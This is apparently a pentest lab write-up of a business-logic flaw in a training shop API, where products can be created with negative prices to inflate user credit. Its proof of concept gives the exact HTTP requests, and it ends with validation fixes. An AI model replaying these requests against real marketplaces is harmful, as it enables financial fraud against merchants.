# Business Logic Vulnerability – Negative Price Injection → Credit Abuse

---

## Summary

The application allows authenticated users to create products with **negative prices**, which leads to **business logic abuse and financial manipulation**.

An attacker can:
- Create products with negative values
- Influence system credit logic
- Potentially gain unauthorized financial advantage

---

## Affected Endpoints

```
POST /identity/api/auth/login
GET  /identity/api/v2/user/dashboard
POST /workshop/api/shop/products
GET  /workshop/api/shop/products
```

---

## Root Cause

- No validation enforcing **positive price values**
- Backend accepts arbitrary numeric input
- Business logic fails to prevent **invalid economic behavior**

---

## Proof of Concept (PoC)

---

### Step 1 – Authenticate

#### Request

```http
POST /identity/api/auth/login HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json

{
  "email": "victim@mail.com",
  "password": "Password123!"
}
```

#### Response

```json
{
  "token": "<JWT_TOKEN>",
  "type": "Bearer",
  "message": "Login successful"
}
```

---

### Step 2 – Verify Initial Credit

#### Request

```http
GET /identity/api/v2/user/dashboard HTTP/1.1
Authorization: Bearer <JWT_TOKEN>
```

#### Response

```json
{
  "available_credit": 1100.0
}
```

---

### Step 3 – Observe Existing Negative Price Products

#### Request

```http
GET /workshop/api/shop/products HTTP/1.1
Authorization: Bearer <JWT_TOKEN>
```

#### Response (Truncated)

```json
{
  "products": [
    {
      "name": "Making My Self Rich",
      "price": "-1000.00"
    },
    {
      "name": "Another Fancy Tire",
      "price": "-30.00"
    }
  ]
}
```

---

### Step 4 – Create Product with Negative Price (Exploit)

#### Request

```http
POST /workshop/api/shop/products HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json
Authorization: Bearer <JWT_TOKEN>

{
  "name": "Hacked Wheel Lamborghini",
  "price": "-2000",
  "image_url": "https://example.com/image.jpg"
}
```

#### Response

```json
{
  "id": 5,
  "name": "Hacked Wheel Lamborghini",
  "price": "-2000.00"
}
```

---

### Step 5 – Confirm Product Creation

#### Request

```http
GET /workshop/api/shop/products?limit=30&offset=0 HTTP/1.1
Authorization: Bearer <JWT_TOKEN>
```

#### Response (Truncated)

```json
{
  "products": [
    {
      "id": 5,
      "name": "Hacked Wheel Lamborghini",
      "price": "-2000.00"
    }
  ]
}
```

---

## Impact

### Financial Manipulation

- Negative pricing can increase user credit instead of deducting it
- Enables free or profitable transactions

### Business Logic Bypass

- System trusts user-controlled pricing
- No validation of economic constraints

### Abuse Scenarios

- Infinite credit generation
- Marketplace exploitation
- Revenue loss

---

## Severity

**High**

- Direct financial impact
- Low complexity
- No special privileges required

---

## Recommendations

### Enforce Positive Pricing

```python
if price <= 0:
    reject_request()
```

### Backend Validation

- Accept only numeric values greater than zero
- Reject negative values

### Database Constraint

```
CHECK (price > 0)
```

### Business Logic Controls

- Prevent creation of negative-value products

---

## Conclusion

The application is vulnerable to **business logic abuse via negative pricing**, allowing attackers to manipulate financial outcomes and potentially gain **unauthorized credit or monetary advantage**.

Immediate remediation is required.
